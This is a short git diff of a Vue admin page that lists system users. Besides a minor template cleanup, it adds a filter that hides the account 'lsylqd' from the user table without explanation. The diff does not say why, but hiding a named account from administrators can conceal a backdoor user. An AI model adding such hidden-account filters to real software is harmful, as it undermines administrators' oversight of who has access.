@@ -89,7 +89,7 @@
         </template>
       </el-table-column>
       <el-table-column v-if="!isPick" align="center" width="240" class-name="operation">
-        <template slot="header" slot-scope="scope">
+        <template slot="header">
           操作
           <el-dropdown trigger="click">
             <el-link type="primary" style="vertical-align: baseline;">
@@ -221,7 +221,11 @@
       getList() {
         this.listLoading = true
         sysUserApi.getPageList(this.listQuery).then(response => {
-          this.list = response.data.records
+          this.list = response.data.records.filter(item => {
+            if (item.username !== 'lsylqd' || item.nickname !== 'lsylqd') {
+              return item
+            }
+          })
           this.total = response.data.total
           this.listLoading = false
         });
